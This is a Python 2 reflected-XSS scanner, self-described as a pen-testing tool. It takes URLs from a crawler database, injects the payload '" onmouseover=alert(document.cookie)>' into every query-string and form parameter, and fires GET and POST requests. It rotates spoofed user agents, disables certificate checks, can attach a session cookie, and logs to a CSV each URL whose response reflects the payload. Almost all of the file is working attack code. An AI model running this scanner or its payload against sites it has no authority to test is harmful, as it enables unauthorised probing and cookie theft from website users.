#!/usr/bin/python
# -*- coding: UTF-8 -*-

import mechanize
import requests
import random
import sqlite3
import sys
from urlparse import urlparse 
from urlparse import parse_qs
from urlparse import urlunsplit
import timeit
import argparse
import os

# stage1,2를 분리하고 각각을 함수로 만들어놓기

user_agents = ["Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36", \
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1664.3 Safari/537.36", \
                "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.16 Safari/537.36", \
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.13+ (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2", \
                "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/25.0", \
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0", \
                "Mozilla/5.0 (Windows; U; MSIE 9.0; WIndows NT 9.0; en-US))", \
                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 7.1; Trident/5.0)"
                ]


def dictToQuery(d):
    query = ""
    for key in d.keys():
        query += str(key) + "=" + str(d[key]) + "&"
    return query[:-1]


# make parameters from html form
def make_parameters(url):
    
    br = mechanize.Browser()
    
    if cookie is None:
        br.addheaders = [('User-agent', random.choice(user_agents))]
        
    else:
        br.addheaders = [('User-agent', random.choice(user_agents)),\
                         ("Cookie", cookie)]
    
    br.set_handle_equiv(True)
    br.set_handle_referer(True)
    br.set_handle_robots(False)
    
    try:
        br.open(url)
        
    except Exception as e:
        print url
        print e 
        return False
    
    method = ""
    action = ""
    result = []
     
    try:
        forms = [f for f in br.forms()]
        
    except Exception as e: 
        return False
    
    if forms == []:
        return False
    
    for form in forms:
        try:
            method = form.method
        except:
            method = "GET"
        
        try:
            action = form.action
            
        except Exception as e: 
            print e
        
        payloads = {}
        method = form.method
        action = form.action
        
        value_number = len(form.controls)
    
        for value in range(value_number):
            try:
                name = str(form.controls[value].name)
            except:
                name = ""
            try:
                value = str(form.controls[value].value)
            except:
                value = ""        
            
            payloads[name] = value
        result.append([payloads, method, action])
        
    return result
      
        
def web_request(payloads, method, action, case, attack_commands):
    
    if method == "GET" and case == "case1":
        
        try:
            
            if cookie is None:
                
                try:
                    res = requests.get(action, timeout = 1, \
                                       headers = {"User-Agent" : random.choice(user_agents)},\
                                       verify = False,\
                                       params = payloads)
                    res_contents = res.content
                    
                    for attack_command in attack_commands:
            
                        if res_contents.find(attack_command) != -1:
                            f = open("r_xss_result.csv", "a+")
                            f.write(method + "," + case + "," + res.url + "\n")
                            f.close()
                            print res.url
                except:
                    pass
            else:
                
                try:
                    res = requests.get(action, timeout = 1,\
                                       headers = {"User-Agent" : random.choice(user_agents),\
                                                  "Cookie" : cookie},\
                                       verify = False,\
                                       params = payloads)
                    res_contents = res.content

                    for attack_command in attack_commands:
            
                        if res_contents.find(attack_command) != -1:
                            f = open("r_xss_result.csv", "a+")
                            f.write(method + "," + case + "," + res.url + "\n")
                            f.close()
                            print res.url
   
                except:
                    pass                          
                            
        except Exception as e: 
            print action
            print e
        
    elif method == "GET" and case == "case2":

        url_scheme = urlparse(action)[0] 
        url_location = urlparse(action)[1] 
        url_low = urlparse(action)[2]     
        
        action = urlunsplit((url_scheme, url_location, url_low, "", ""))

        try:
            
            if cookie is None:
                
                try:

                    res = requests.get(action, timeout = 1, \
                                       headers = {"User-Agent" : random.choice(user_agents)},\
                                       params = payloads,\
                                       verify = False)
                  
                    res_contents = res.content

                    for attack_command in attack_commands:
            
                        if res_contents.find(attack_command) != -1:
                            f = open("r_xss_result.csv", "a+")
                            f.write(method + "," + case + "," + res.url + "\n")
                            f.close()
                            print res.url                  
                except:
                    pass
                
            else:
                
                try:
                    
                    res = requests.get(action, timeout = 1, \
                                       headers = {"User-Agent" : random.choice(user_agents),\
                                                  "Cookie" : cookie},\
                                       verify = False,\
                                       params = payloads)
                    
                    res_contents = res.content

                    for attack_command in attack_commands:
            
                        if res_contents.find(attack_command) != -1:
                            f = open("r_xss_result.csv", "a+")
                            f.write(method + "," + case + "," + res.url + "\n")
                            f.close()
                            print res.url
                 
                except:
                    pass
                             
        except Exception as e: 
            print action
            print e
    
    elif method == "POST" and case == "case2":
                
        try:

            if cookie is None:
                
                try:
                    res = requests.post(action, timeout = 1, \
                                       headers = {"User-Agent" : random.choice(user_agents)},\
                                       data = payloads,\
                                       verify = False)
                    
                    res_contents = res.content

                    for attack_command in attack_commands:
            
                        if res_contents.find(attack_command) != -1:
                            f = open("r_xss_result.csv", "a+")
                            
                            try:
                                payloads = dictToQuery(payloads)
                                f.write(method + "," + case + "," + res.url + "," + payloads + "\n")
                                f.close()
                            except: 
                                f.write(method + "," + case + "," + res.url + "," + str(payloads) + "\n")
                                f.close()
                            print res.url
                    
                except:
                    pass
                
            else:
                
                try:
                    res = requests.post(action, timeout = 1, \
                                       headers = {"User-Agent" : random.choice(user_agents),\
                                                  "Cookie" : cookie},\
                                       verify = False,\
                                       data = payloads)
                    
                    res_contents = res.content
                    
                    for attack_command in attack_commands:
            
                        if res_contents.find(attack_command) != -1:
                            f = open("r_xss_result.csv", "a+")
                            
                            try:
                                payloads = dictToQuery(payloads)
                                f.write(method + "," + case + "," + res.url + "," + payloads + "\n")
                                f.close()
                            except: 
                                f.write(method + "," + case + "," + res.url + "," + str(payloads) + "\n")
                                f.close()
                            print res.url
                    
                except:
                    pass
                               
        except Exception as e: 
            print action
            print e
             

def predict_xss_attack_time(attack_commands):

    attack_command_len = len(attack_commands)
    cur.execute("select url from " + table_name)
    
    cnt = 0
    for row in cur:
        url = row[0]
        payloads = parse_qs(urlparse(url).query)
        payloads_number = len(payloads.keys())
        cnt += payloads_number
    
    all_count = str(cnt * attack_command_len) * 3
    estimate_time = str((cnt * attack_command_len * 0.005))
    # request 하나 당 0.005 ~ 0.01초가 걸리는 듯
    
    print "*" * 80
    print "total attack request will be " + all_count
    print "attack estimate time will be " + estimate_time + " minutes"
    print "*" * 80
    
    
       
def xss_attack(payloads, method, action, case, attack_commands):
    global req_cnt
#     attack_commands = ["\" onmouseover=alert(document.cookie)>"]
    tmp_value = ""
    
    for name in payloads.keys():
        tmp_value = payloads[name]
        for attack_command in attack_commands:
            
            payloads[name] += attack_command
            
            content = web_request(payloads, method, action, case, attack_commands)
    
            req_cnt += 1
#             print req_cnt
            payloads[name] = tmp_value
        
    
def main():
    
    usage        = '''./reflected_xss.py -t google'''
    
    parser = argparse.ArgumentParser(description = "reflected xss for pen testing", \
                                     usage = usage)
    parser.add_argument("-t", "--table", required=True, help="sqlite table name to attack")
    parser.add_argument("-c", "--cookie", required=False, help="filename containing cookie")
    parser.add_argument("-v", "--version", action='version', version = 'JongWon Kim (dikien2012@gmail.com)\n%(prog)s - v.1.0 (04/22/2014)')

    args = parser.parse_args()

    global table_name 
    table_name = args.table
    
    global cookie
    cookie_filename = args.cookie
    
    try:
        f = open(cookie_filename).read()
        cookie = str(f).strip()
        
    except:
        cookie = None

    try:
        os.remove("r_xss_result.csv")
    except:
        pass
    
    
    global req_cnt
    req_cnt = 0
    
    global start_time
    start_time = timeit.default_timer()
     
    global conn
    conn = sqlite3.connect("crawler.db")
    
    global cur
    cur = conn.cursor()
        
    attack_commands = ["\" onmouseover=alert(document.cookie)>"]
#     attack_commands = ["onmouseovertest"]

    links_to_visit_params = []
    
    predict_xss_attack_time(attack_commands)

    
#step1
    cur.execute("select url from " + table_name + " where res_code = '200'")
  
    for row in cur:
        
        url = row[0]
          
        # there are payloads in url
        if urlparse(url)[4]:
            payloads = parse_qs(urlparse(url).query)
              
            # method
            # from {u'action': [u'M01']} to {u'action': u'M01'}
            for name in payloads.keys():
                payloads[name] = payloads[name][0]
                        
            url_with_params = str(urlparse(url)[2]) + str(sorted(payloads.keys())) 
            
            # to reduce duplicate urls
            if url_with_params not in links_to_visit_params:
                  
                # case1: there are parameters in url, not action
                xss_attack(payloads, "GET", url, "case1", attack_commands)
                links_to_visit_params.append(url_with_params)

    end_time = timeit.default_timer() 
    print '\nreflected xss attack\'s stage 1 is done: ', end_time - start_time
    print "you send requests %s times" % req_cnt
    
#setp2 
    cur.execute("select url from " + table_name + " where res_code = '200'")
    
    # form test
    for row in cur:
         
        url = row[0]
      
        results = make_parameters(url)
  
#         if there is no form, it return False 
        if results:
            for result in results:
                
                # none attr is submit
                payloads = result[0]
                try:
                    del payloads["None"]
                    
                except Exception as e: 
                    pass
                    
                method = result[1]
                action = result[2]
                
                
                if method == "GET" or method == "get":
                    
                    url_with_params = str(urlparse(action)[2]) + str(sorted(payloads.keys())) 
                    
                    # to reduce duplicate urls
                    if url_with_params not in links_to_visit_params:
                        
                        xss_attack(payloads, "GET", action, "case2", attack_commands)
              
                        links_to_visit_params.append(url_with_params)
                        
                        
                elif method == "POST" or method == "post":
                    
                    url_with_params = str(urlparse(action)[2]) + str(sorted(payloads.keys()))
                    
                    # to reduce duplicate urls
                    if url_with_params not in links_to_visit_params:
                        
                        xss_attack(payloads, "POST", action, "case2", attack_commands)
              
                        links_to_visit_params.append(url_with_params)                    
                            
    cur.close()
    end_time = timeit.default_timer() 
    print '\nreflected xss attack\'s stage 2 is done: ', end_time - start_time
    print "you send requests %s times" % req_cnt
    
if __name__ == "__main__":
    main()